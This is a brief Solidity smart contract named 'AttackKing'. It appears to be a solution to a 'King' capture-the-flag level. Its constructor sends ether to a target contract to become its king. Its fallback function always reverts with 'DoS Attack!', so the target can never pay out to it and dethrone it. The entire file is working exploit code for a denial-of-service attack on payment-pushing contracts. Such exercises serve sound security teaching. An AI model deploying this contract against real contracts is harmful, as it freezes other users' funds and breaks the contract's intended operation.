// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    fallback() external payable{
        revert("DoS Attack!");
    }
    constructor(address payable _king) payable {
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "fail");
    }
}